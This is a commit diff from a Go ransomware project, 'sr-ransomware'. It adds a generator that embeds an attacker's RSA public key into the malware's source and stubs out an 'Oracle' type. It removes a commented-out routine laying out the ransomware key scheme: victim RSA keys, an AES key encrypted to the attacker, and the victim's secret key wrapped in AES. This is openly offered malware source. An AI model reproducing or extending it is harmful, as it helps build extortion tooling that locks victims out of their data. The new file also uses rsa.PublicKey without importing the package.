1e0a27c4439745fca6342754a74869d5eca81b91
sugoiuguu <sugoiuguu@tfwno.gf>
2020-05-09 19:56:35 +0100

    oracle imports attacker's public key

---
+++ go/crypto/scheme/attacker/generate/key.go
@@ -0,0 +1,37 @@
+package main
+
+import (
+    "os"
+    "log"
+    "fmt"
+    "io/ioutil"
+    "path/filepath"
+
+    "github.com/sug0/sr-ransomware/go/crypto/util"
+)
+
+func main() {
+    pem, err := ioutil.ReadFile(filepath.Join("..", "..", "..", "..", "res", "attacker", "key.pub"))
+    if err != nil {
+        log.Fatal(err)
+    }
+    pk, err := util.ImportPEMPublicKeyRSA(pem)
+    if err != nil {
+        log.Fatal(err)
+    }
+    der, err := util.ExportDERPublicKeyRSA(pk)
+    if err != nil {
+        log.Fatal(err)
+    }
+    f, err := os.Create("public.go")
+    if err != nil {
+        log.Fatal(err)
+    }
+    defer f.Close()
+    fmt.Fprintf(f, "package attacker;")
+    fmt.Fprintf(f, "var oraclePublicKey=[]byte{")
+    for i := 0; i < len(der); i++ {
+        fmt.Fprintf(f, "%d,", der[i])
+    }
+    fmt.Fprintf(f, "}")
+}
--- go/crypto/scheme/attacker/scheme.go
+++ go/crypto/scheme/attacker/scheme.go
@@ -1,62 +1,24 @@
 package attacker
 
-// Generate all the appropriate keys in the malware
-// work dir.
-//func GenerateKeys() error {
-//    // global rsa key
-//    pk, err := ImportPublicKey()
-//    if err != nil {
-//        return err
-//    }
-//
-//    // local rsa keys
-//    sk, err := util.GenerateKeyRSA(rsaKeyBits)
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to generate RSA secret key", err)
-//    }
-//    pkData, err := util.ExportDERPublicKeyRSA(&sk.PublicKey)
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to marshal RSA public key", err)
-//    }
-//    err = ioutil.WriteFile(filepath.Join(workDir, victimPublicKey), pkData, 0644)
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to write RSA public key", err)
-//    }
-//
-//    // aes key stuff
-//    aesKey, err := util.GenerateAES()
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to generate AES key", err)
-//    }
-//    aesIV, err := util.GenerateAES()
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to generate AES IV", err)
-//    }
-//    aesBlock, _ := aes.NewCipher(aesKey)
-//    aesCiph := cipher.NewCTR(aesBlock, aesIV)
-//
-//    // export rsa pub encrypted with aes
-//    skData, err := util.ExportDERSecretKeyRSA(sk)
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to marshal RSA secret key", err)
-//    }
-//    skData = util.Pad(skData, aes.BlockSize)
-//    aesCiph.XORKeyStream(skData, skData)
-//    err = ioutil.WriteFile(filepath.Join(workDir, victimSecretKey), skData, 0644)
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to write RSA secret key", err)
-//    }
-//
-//    // export aes key encrypted with rsa pub
-//    ivKey := append(aesIV, aesKey...)
-//    aesEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, pk, ivKey)
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to encrypt AES key", err)
-//    }
-//    err = ioutil.WriteFile(filepath.Join(workDir, victimAESKey), aesEncrypted, 0644)
-//    if err != nil {
-//        return errors.Wrap(pkg, "failed to write AES key", err)
-//    }
-//
-//    return nil
-//}
+import (
+    "path/filepath"
+
+    "github.com/sug0/sr-ransomware/go/errors"
+    "github.com/sug0/sr-ransomware/go/crypto/util"
+)
+
+//go:generate go run generate/key.go
+
+type Oracle struct {
+    key  *rsa.PublicKey
+    path string
+}
+
+func NewOracle(path string) *Oracle {
+    pk, _ := util.ImportDERPublicKeyRSA(oraclePublicKey)
+    return &Oracle{key: pk, path: filepath.Clean(path)}
+}
+
+func (*Oracle) GenerateAndStoreKey() error {
+    return nil
+}
